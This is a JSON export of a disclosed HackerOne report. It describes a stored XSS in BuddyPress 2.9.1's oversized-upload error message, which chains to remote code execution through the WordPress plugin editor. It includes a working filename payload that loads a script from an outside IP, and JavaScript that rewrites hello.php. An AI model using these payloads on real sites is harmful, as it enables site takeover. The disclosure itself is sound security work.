{"id":263109,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjMxMDk=","url":"https://hackerone.com/reports/263109","title":"Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. ","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-08-24T22:55:44.354Z","submitted_at":"2017-08-24T22:55:44.354Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skansing","url":"/skansing","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-02T17:04:35.375Z","bug_reporter_agreed_on_going_public_at":"2017-11-02T17:02:53.537Z","team_member_agreed_on_going_public_at":"2017-11-02T17:04:35.296Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Description\nThis report is very similar to https://hackerone.com/bugs?subject=user\u0026report_id=203515 so I will not go into too much details.\n\nWhen uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.\n\nThe interfaces for upload that are vuln can be found at\ndomain.tld/members/USERNAME/profile/change-cover-image/\ndomain.tld/members/bbuser/profile/change-avatar/\ndomain.tld/wp-admin/users.php?page=bp-profile-edit\n \n# POC\nThe POC explores a chain of XSS =\u003e XSSI =\u003e RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions\n\n- Login as admin\n- Goto `/wp-admin/users.php?page=bp-profile-edit`\n- Upload a file with the following name (mentioned below) as admin for.\n\nFilename \n`POC\u003cimg src=x onerror='document.write(atob(\"UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=\"))'\u003e`\n\nThe base64 data can be verified by\n`btoa('Running POC\u003cscript type=\"text/javascript\" src=\"http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js\"\u003e\u003c/script\u003e');` in the browser conole.\n\nThis scripts loads the RCE script that changes the hello.php with \u003c?php phpinfo() and redirect to it.\n```\nvar i = document.createElement(\"iframe\");\ni.src = \"http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\";\ndocument.querySelector(\"body\").appendChild(i);\nsetTimeout(function() {\n  var p = \"\u003c?php phpinfo();\"\n  var d = document.querySelector(\"iframe\").contentWindow.document;\n  var c = d.querySelector(\"#newcontent\")\n  var s = d.querySelector(\"#submit\")\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \"http://127.0.0.1:8090/wp-content/plugins/hello.php\"\n}, 4000);\n```\n\n# Suggested fix\nSanitize the error. I suspect it needs a run through `.html()` as in #203515\n","vulnerability_information_html":"\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eThis report is very similar to \u003ca title=\"https://hackerone.com/bugs?subject=user\u0026amp;report_id=203515\" href=\"https://hackerone.com/bugs?subject=user\u0026amp;report_id=203515\"\u003ehttps://hackerone.com/bugs?subject=user\u0026amp;report_id=203515\u003c/a\u003e so I will not go into too much details.\u003c/p\u003e\n\n\u003cp\u003eWhen uploading a avatar or profile background image thats larger than allowd, the error containing the filename will be output unsanitized leading to XSS. Making the victim upload a strangely named file for his profile requires some social engineering. Any user is vuln, but has to be admin to escalate to RCE.\u003c/p\u003e\n\n\u003cp\u003eThe interfaces for upload that are vuln can be found at\u003cbr\u003e\ndomain.tld/members/USERNAME/profile/change-cover-image/\u003cbr\u003e\ndomain.tld/members/bbuser/profile/change-avatar/\u003cbr\u003e\ndomain.tld/wp-admin/users.php?page=bp-profile-edit\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePOC\u003c/h1\u003e\n\n\u003cp\u003eThe POC explores a chain of XSS =\u0026gt; XSSI =\u0026gt; RCE via same origin scripting, the route via XSSI is mainly due to file and char length restrictions\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eLogin as admin\u003c/li\u003e\n\u003cli\u003eGoto \u003ccode\u003e/wp-admin/users.php?page=bp-profile-edit\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eUpload a file with the following name (mentioned below) as admin for.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFilename \u003cbr\u003e\n\u003ccode\u003ePOC\u0026lt;img src=x onerror=\u0026#39;document.write(atob(\u0026quot;UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=\u0026quot;))\u0026#39;\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe base64 data can be verified by\u003cbr\u003e\n\u003ccode\u003ebtoa(\u0026#39;Running POC\u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026#39;);\u003c/code\u003e in the browser conole.\u003c/p\u003e\n\n\u003cp\u003eThis scripts loads the RCE script that changes the hello.php with \u0026lt;?php phpinfo() and redirect to it.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003evar i = document.createElement(\u0026quot;iframe\u0026quot;);\ni.src = \u0026quot;http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php\u0026quot;;\ndocument.querySelector(\u0026quot;body\u0026quot;).appendChild(i);\nsetTimeout(function() {\n  var p = \u0026quot;\u0026lt;?php phpinfo();\u0026quot;\n  var d = document.querySelector(\u0026quot;iframe\u0026quot;).contentWindow.document;\n  var c = d.querySelector(\u0026quot;#newcontent\u0026quot;)\n  var s = d.querySelector(\u0026quot;#submit\u0026quot;)\n  c.value = p\n  s.click();\n}, 2000);\nsetTimeout(function() {\n  window.location.href = \u0026quot;http://127.0.0.1:8090/wp-content/plugins/hello.php\u0026quot;\n}, 4000);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"suggested-fix\"\u003eSuggested fix\u003c/h1\u003e\n\n\u003cp\u003eSanitize the error. I suspect it needs a run through \u003ccode\u003e.html()\u003c/code\u003e as in \u003ca href=\"/reports/203515\"\u003e#203515\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"275.0","formatted_bounty":"$275","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-02T17:02:53.975Z","allow_singular_disclosure_after":-96984773.70039955,"singular_disclosure_allowed":true,"vote_count":14,"voters":["jokebookservice1","jdgrimes","jensec","bl4de","skansing","eveeez","khizer47","cr4xerbik4sh","japz","clarckowen_","and 4 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1953328,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-24T23:07:17.311Z","updated_at":"2017-08-24T23:07:17.311Z","additional_data":{"old_title":"Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS to RCE. ","new_title":"Buddypress 2.9.1 - Exceeding the maximum upload size  - XSS leading to potential RCE. "},"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1956295,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @skansing,\n\nSorry it took a little longer to get to this one. Moving this to triaged as well since I was able to reproduce it.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/skansing\"\u003e@skansing\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry it took a little longer to get to this one. Moving this to triaged as well since I was able to reproduce it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-26T01:48:01.514Z","updated_at":"2017-08-26T01:48:01.514Z","actor":{"username":"voldemortensen","cleared":false,"url":"/voldemortensen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/090/577/2f2c151123b2d4917e8791b96987f0fde30d95bc_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2122169,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @skansing - Many apologies for the radio silence. I got confused about the status of the related WP ticket, and as a result this one fell off my radar.\n\nI've confirmed the issue, and written a patch along the lines of what you suggest above. Could you please confirm that it solves the problem for you?\n\nThe BP team has already scheduled a release for tomorrow for unrelated reasons. If we're able to review and confirm the patch internally by then, we hope to include it. Otherwise, we are aiming to have another maintenance release that could contain this security fix within the following two weeks. I'll follow up here when I have more details about timeline.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/skansing\"\u003e@skansing\u003c/a\u003e - Many apologies for the radio silence. I got confused about the status of the related WP ticket, and as a result this one fell off my radar.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve confirmed the issue, and written a patch along the lines of what you suggest above. Could you please confirm that it solves the problem for you?\u003c/p\u003e\n\n\u003cp\u003eThe BP team has already scheduled a release for tomorrow for unrelated reasons. If we\u0026#39;re able to review and confirm the patch internally by then, we hope to include it. Otherwise, we are aiming to have another maintenance release that could contain this security fix within the following two weeks. I\u0026#39;ll follow up here when I have more details about timeline.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-01T18:38:07.977Z","updated_at":"2017-11-01T18:38:07.977Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":235263,"filename":"error-xss.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/235/263/7c01ee0dbec7db465a67cd91f6150e8fdc976326/error-xss.diff?response-content-disposition=attachment%3B%20filename%3D%22error-xss.diff%22%3B%20filename%2A%3DUTF-8%27%27error-xss.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ37US5OJ5%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T051547Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICX%2BZzEwV7S7tK2Teu4enaTjTMNodN0T8CBwGyp3%2FdhpAiBcDP7u5XE0svrQAEReRRQSWfUQfGu9%2F0dDFi9HZXbFlSq0AwhUEAEaDDAxMzYxOTI3NDg0OSIMqovxw%2Fi0N89X43L%2FKpEDQix1tw9gEfEoYbXT5osPFpMOwfBuizjPU7n9OmST3GiDPuXEgYLvbvfAQGYte9YY2QoNfSH%2Bs3y1JVdVw8yUicjfLoFaEW6wkvABFFfNqnjSBFzSElON%2F%2B3j8UNBRmn2xcLmCFWjMnOAbTftnafIeYcBCAYh2gO4XfF%2FteefEF5baEqal82tljdlrWvxdb4xY%2BeiVvoO6eYgRa7kp50RAoYeprdo02AYM%2F61DJSrZXwMLYr6Xgv6MB1iMnaxJ5rMcXXMrHucVPXBHEcRWopMmQkkB%2FPc9SAPzXjSXPb7jJbEGBrLze60DYXEBrpIFUG1Kick24m%2B5k5jryTy4Jw50w8CXizU5ICguGu3KHM1om3lDn5KQPJLn1HdcT%2BsfoJiJu6SGt9hXKzCtCfUH3%2FFvhBtwm8JD87PMGYoEwVm%2FlNfMX0wjZsROXJIlnxZXImztW5C0Q8%2B8vUj4F7brk0S72obIPPXA9sraxsX4VqG%2BXQBK%2B1E%2BcproSDOuO49QLzWGa%2ByNqmZvUzlIRh6xUU3P5owvrOq%2FwU67AGtB67YYS3OrDI7mh5rocz4yCfx2WY%2BOcICeNC4fwRACHwc09Uiz%2FFPJoVVVUxZVu%2BGwd0PK0Cv2KxEe%2F6DbJ%2F4dqWms9lNmfzBIAqvj8iCblJU7lJE5gNjjGio7mXbIVYDlATJCq41LKJBckyAK5GaLf5E3hKwYqawTi1drEQoAWGm0MLdRWPWFAAmAH9lq7XnOuVzoaZV9I6BQOa6%2Bsw888c6CCB%2BW6%2Fs%2FWznBvXU9NUgtAV0VB3hWt7rH3AQXIkYZTG86Yk6TyvtNdyHfs%2FoRwKKnb1x1yTXlrvbtiAXPCAeCL0oqSsvNwFJhw%3D%3D\u0026X-Amz-Signature=b82fbcc77bd7ba8d6059bfa9463ac54cdbfd63b26b3d3da56b1f302691cf167f"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2122732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @boonebgorges - thanks for the response, I have tested the diff locally by overwritting the `bp-plupload.min.js` with the contents of a patched `bp-plupload.js`, I guess the minimized file is build somehow is the deploy/build process before release. It did the trick, neither of the 3 areas had any XSS after the change. \n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/boonebgorges\"\u003e@boonebgorges\u003c/a\u003e - thanks for the response, I have tested the diff locally by overwritting the \u003ccode\u003ebp-plupload.min.js\u003c/code\u003e with the contents of a patched \u003ccode\u003ebp-plupload.js\u003c/code\u003e, I guess the minimized file is build somehow is the deploy/build process before release. It did the trick, neither of the 3 areas had any XSS after the change. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-01T21:06:24.478Z","updated_at":"2017-11-01T21:12:30.559Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2126291,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Fixed in BP 2.9.2 https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/","markdown_message":"\u003cp\u003eFixed in BP 2.9.2 \u003ca title=\"https://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/\" href=\"/redirect?url=https%3A%2F%2Fbuddypress.org%2F2017%2F11%2Fbuddypress-2-9-2-security-and-maintenance-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://buddypress.org/2017/11/buddypress-2-9-2-security-and-maintenance-release/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T16:41:33.342Z","updated_at":"2017-11-02T16:41:33.342Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skansing","url":"/skansing"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2127358,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-02T17:02:53.681Z","updated_at":"2017-11-02T17:02:53.681Z","first_to_agree":true,"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2127370,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-02T17:04:35.318Z","updated_at":"2017-11-02T17:04:35.318Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2127371,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-02T17:04:35.397Z","updated_at":"2017-11-02T17:04:35.397Z","actor":{"username":"boonebgorges","cleared":false,"url":"/boonebgorges","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2144136,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-08T21:00:22.188Z","updated_at":"2017-11-08T21:00:22.188Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"WordPress"}},"bounty_amount":"225.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"skansing","url":"/skansing"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}